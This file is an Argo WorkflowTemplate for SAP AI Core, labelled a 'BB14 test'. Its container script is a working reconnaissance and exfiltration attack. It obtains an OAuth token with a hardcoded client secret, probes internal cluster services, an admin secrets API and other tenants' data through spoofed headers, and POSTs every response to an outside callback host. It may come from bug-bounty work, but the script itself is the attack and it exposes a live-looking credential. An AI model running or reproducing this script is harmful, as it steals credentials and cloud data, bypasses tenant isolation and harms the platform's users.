apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "6.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }

        get "recon6-start-$(hostname)"

        # 1. Get JWT from inside the pod via OAuth
        TOKEN=$(curl -k -s -X POST "https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com/oauth/token" \
          -H "Content-Type: application/x-www-form-urlencoded" \
          -d "grant_type=client_credentials" \
          -d "client_id=sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784" \
          -d "client_secret=aicore-bb-14-key\$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc=" \
          | grep -oE '"access_token":"[^"]+' | cut -d'"' -f4)
        echo "token_len=$(echo -n $TOKEN | wc -c)" | post "recon6-token-len"

        # 2. Hit Connectivity Service with real JWT
        CONN="http://100.104.7.43:20003"
        curl -k -s --connect-timeout 5 "${CONN}/" \
          -H "SAP-CP-Connectivity-Service-Token: ${TOKEN}" 2>&1 | head -c 700 | post "recon6-conn-jwt"
        curl -k -s --connect-timeout 5 "${CONN}/api/v1/health" \
          -H "SAP-CP-Connectivity-Service-Token: ${TOKEN}" 2>&1 | head -c 700 | post "recon6-conn-health"

        # 3. Hit MLflow tracking with real JWT as Bearer
        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon6-track-bearer-1"
        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "Authorization: Bearer ${TOKEN}" 2>&1 | tail -c +701 | head -c 700 | post "recon6-track-bearer-2"
        # Try MLflow runs search
        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/runs/search" \
          -H "Authorization: Bearer ${TOKEN}" \
          -H "Content-Type: application/json" \
          -X POST -d '{}' 2>&1 | head -c 700 | post "recon6-track-runs"

        # 4. Full OTel metrics dump (check for cross-tenant data)
        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
          curl -k -s --connect-timeout 3 "http://${ip}:8888/metrics" 2>&1 > /tmp/otel_${ip}.txt
          wc -c /tmp/otel_${ip}.txt | post "recon6-otel-size-${ip}"
          # Look for tenant-specific labels in metrics
          grep -i "tenant\|namespace\|rg-\|resource.group\|ai.main" /tmp/otel_${ip}.txt | head -c 700 | post "recon6-otel-tenant-${ip}"
          # Get first and last chunks
          head -c 700 /tmp/otel_${ip}.txt | post "recon6-otel-head-${ip}"
          grep "exporter\|receiver\|processor" /tmp/otel_${ip}.txt | head -c 700 | post "recon6-otel-pipeline-${ip}"
        done

        # 5. Hit AI Core API from INSIDE the cluster (bypass external WAF)
        curl -k -s --connect-timeout 5 "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/admin/secrets" \
          -H "Authorization: Bearer ${TOKEN}" \
          -H "AI-Resource-Group: default" 2>&1 | head -c 700 | post "recon6-api-secrets"

        # 6. Try reading other tenants' data via tracking service
        # Our tenant: 46449013-03b3-4a60-8c2c-5e98fd303498
        # Try different tenant IDs in headers
        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "Authorization: Bearer ${TOKEN}" \
          -H "AI-Main-Tenant: 00000000-0000-0000-0000-000000000000" 2>&1 | head -c 700 | post "recon6-track-tenant0"
        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "Authorization: Bearer ${TOKEN}" \
          -H "AI-Resource-Group: bb-13" 2>&1 | head -c 700 | post "recon6-track-rg13"

        # 7. Usage API namespace probe
        curl -k -s "http://127.0.0.1:15000/clusters" | grep "usage-api" | head -c 700 | post "recon6-usage-clusters"
        for svc in $(curl -k -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.usage-api\.svc\.cluster\.local' | sort -u); do
          curl -k -s --connect-timeout 3 "http://${svc}/" 2>&1 | head -c 500 | post "recon6-usage-$(echo $svc | cut -d. -f1)"
        done

        # 8. Connectivity proxy tunnels
        for i in 0 1 2; do
          curl -k -s --connect-timeout 3 "http://connectivity-proxy-tunnel-${i}.connectivity-proxy.svc.cluster.local/" 2>&1 | head -c 500 | post "recon6-tunnel-${i}"
          curl -k -s --connect-timeout 3 "http://connectivity-proxy-tunnel-${i}.connectivity-proxy.svc.cluster.local:20003/" \
            -H "SAP-CP-Connectivity-Service-Token: ${TOKEN}" 2>&1 | head -c 500 | post "recon6-tunnel-jwt-${i}"
        done

        get "recon6-done-$(hostname)"
      resources:
        limits:
          cpu: "1"
          memory: "1Gi"
        requests:
          cpu: "100m"
          memory: "256Mi"
